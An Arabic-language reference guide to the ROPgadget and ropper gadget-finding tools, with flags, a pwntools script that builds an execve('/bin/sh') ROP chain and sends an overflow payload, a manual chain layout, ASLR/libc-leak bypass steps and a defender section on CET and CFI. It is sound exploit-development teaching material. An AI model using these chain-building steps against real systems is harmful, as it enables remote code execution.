# ROPgadget / ropper — الدليل الكامل

تُستخدم أداتَا `ROPgadget` و `ropper` للعثور على ما يُعرف بـ "الأدوات" (Gadgets) — وهي تتابعات قصيرة من التعليمات البرمجية تنتهي بأمر العودة `ret` (أو `jmp/call <reg>`) — والتي تُستخدم كلبنات بناء لإنشاء سلاسل ROP (Return-Oriented Programming) أو JOP (Jump-Oriented Programming). تقوم كلتا الأداتين بفهرسة الملفات الثنائية (Binaries) أو المكتبات البرمجية وتسمح بالبحث فيها باستخدام الرموز المختصرة (Mnemonics).

## التثبيت (Install)

```terminal
pip install ROPgadget ropper
```

## أساسيات ROPgadget (ROPgadget — basics)

```terminal
ROPgadget --binary ./vuln
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --depth 6 > libc-gadgets.txt

# البحث باستخدام النصوص
ROPgadget --binary ./vuln --re "pop rdi"
ROPgadget --binary ./vuln --string "/bin/sh"

# بناء سلسلة ROP تلقائياً
ROPgadget --binary ./vuln --ropchain --badbytes "0a"
```

| الوسم (Flag) | الغرض |
|------|---------|
| `--binary <file>` | الملف المستهدف |
| `--depth <n>` | الحد الأقصى للتعليمات في الأداة الواحدة |
| `--re <regex>` | التصفية باستخدام التعبير النمطي (Regex) |
| `--string <s>` | العثور على عناوين النصوص |
| `--opcode <hex>` | البحث عن بايتات محددة |
| `--ropchain` | محاولة إنشاء سلسلة `execve("/bin/sh")` تلقائياً |
| `--badbytes "0a 00"` | البايتات الممنوعة في عناوين الأدوات |
| `--multibr` | تضمين الأدوات التي تنتهي بـ `jmp/call` (لـ JOP) |
| `--all` | تضمين الأدوات المتكررة |
| `--filter "pop|leave|ret"` | تصفية الرموز المختصرة |
| `--memstr "/bin/sh"` | البحث داخل الأقسام القابلة للقراءة |
| `--no-jop` / `--no-sys` | استبعاد أدوات JOP أو syscall |

## ropper — البديل الأكثر شمولاً

```terminal
ropper --file ./vuln --search "pop rdi; ret"
ropper --file libc.so.6 --search "syscall;"
ropper --file ./vuln --jmp esp
ropper --file ./vuln --type rop --quality 1
ropper --file ./vuln --string "/bin/sh"
ropper --file ./vuln --chain "execve cmd=/bin/sh"
```

نقاط القوة التي تميز ropper عن ROPgadget:

- دعم أفضل لملفات Mach-O و PE.
- تصنيف الجودة (عرض الأدوات الأقصر والأكثر نظافة أولاً).
- دعم معماريات متعددة: x86 / x64 / ARM / ARM64 / MIPS / PPC / SPARC.
- وضع الكونسول التفاعلي: تشغيل `ropper` ثم استخدام `:` للبحث.

```
$ ropper
(ropper)> file ./vuln
[INFO] Load gadgets from cache
(libc-2.31.so/PE/x86_64) > search /pop rdi/
0x000000000026b72: pop rdi; ret;
0x000000000142302: pop rdi; pop rbp; ret;
(...)
```

## سير العمل — بناء سلسلة ROP (x86_64 Linux)

الهدف: تنفيذ `execve("/bin/sh", 0, 0)`.

اتفاقية الاستدعاء (Calling convention) في نظام System V: المسجلات المستخدمة هي `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`.

```python
from pwn import *

e = ELF('./vuln')
libc = e.libc                           # الكشف التلقائي عن مكتبة libc الملحقة

# العثور على الأدوات عبر pwntools.ROP (تستخدم ROPper / ROPgadget في الخلفية)
rop = ROP([e, libc])
rop.raw(rop.find_gadget(['ret']))       # محاذاة المكدس (Stack alignment)
rop.execve(next(libc.search(b'/bin/sh')), 0, 0)
print(rop.dump())

payload = b'A'*72 + rop.chain()
io.sendline(payload)
io.interactive()
```

تقرأ `pwntools.ROP` الأدوات من الملفات الثنائية التي تحددها؛ بينما يتولى منشئ `.execve()` تحديد الأدوات المناسبة لتحميل `rdi`, `rsi`, `rdx`, و `rax=0x3b` ثم تنفيذ `syscall`.

## السلسلة اليدوية (Manual Chain)

```
[ pop rdi; ret      ]  ← addr0
[ /bin/sh address   ]
[ pop rsi; ret      ]
[ 0                 ]
[ pop rdx; ret      ]
[ 0                 ]
[ pop rax; ret      ]
[ 0x3b              ]
[ syscall; ret      ]
```

تتبع المكدس من عنوان العودة المخترق: يقوم أمر `ret` في كل أداة بسحب (Pop) عنوان الأداة التالية من المكدس. يسهل فحص ذلك باستخدام `gdb` + `pwndbg` عبر أمر `stack 30`.

## ملاحظات حول ASLR و PIE

- **ملفات NoPIE** — الأدوات موجودة في عناوين ثابتة، يمكن كتابتها مباشرة في الكود (Hardcode).
- **ملفات PIE** — تتطلب تسريب عنوان (Leak) أولاً؛ حيث تكون عناوين الأدوات نسبية لقاعدة الملف الثنائي.
- **مكتبة libc مع تفعيل ASLR** — يتطلب تسريب عنوان من libc (مثل printf GOT) ← حساب قاعدة libc ← استخدام `libc-database` لمعرفة الإصدار ← ثم استخدام أدوات libc.

```terminal
libc-database/find printf 0xf7e89870
# يعيد ملفات libc المطابقة؛ استخدم ملف .so المناسب لحساب الإزاحات (Offsets)
```

## تشخيص المشاكل (Bad output / Fixes)

| العرض | الحل |
|---------|-----|
| `--ropchain` يعطي "no chain found" | الملف الثنائي صغير جداً؛ استخدم أدوات من libc أيضاً |
| الأدوات تظهر "bad characters in address" | استخدم `--badbytes` لاختيار عناوين بديلة لا تحتوي على البايتات الممنوعة |
| ذاكرة التخزين المؤقت قديمة | بعض الأدوات تستخدم التخزين المؤقت؛ امسح مجلد `~/.ropper/` |
| معمارية خاطئة | استخدم `--arch x86_64`؛ وتحقق من نوع الملف باستخدام `file ./vuln` |
| الحاجة لأدوات ARM/Thumb | استخدم `ropper --arch ARMTHUMB` |

## منظور المدافع (Defender Perspective)

يتطلب استغلال ROP / JOP وجود أدوات (Gadgets) كافية. الدفاعات تشمل:

- **CET / Shadow Stack** — تقنيات هاردوير من Intel/AMD تبطل عمل ROP عبر مكدس الظل.
- **CFI (Control-Flow Integrity)** — مثل خيار `-fsanitize=cfi` في Clang/LLVM.
- **PIE + Full ASLR** — تجعل تسريب العناوين خطوة إجبارية للمهاجم.
- **الملفات المجردة (Stripped Binaries)** — تقلل من سطح الهجوم بشكل طفيف.
- **أعلام المجمع (Compiler Flags)** — مثل `-Wl,-z,now`, `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2`.

## أدوات ذات صلة

| الأداة | التخصص |
|------|-------|
| **pwntools.ROP** | منشئ سلاسل عالي المستوى |
| **angrop** | بناء سلاسل ROP برمجياً عبر محرك angr الرمزي |
| **one_gadget** | العثور على أداة واحدة داخل libc لتشغيل shell |
| **xrop** | متخصص في معماريات ARM |
| **gef / pwndbg** | عرض سلاسل ROP بشكل حي ومباشر داخل gdb |
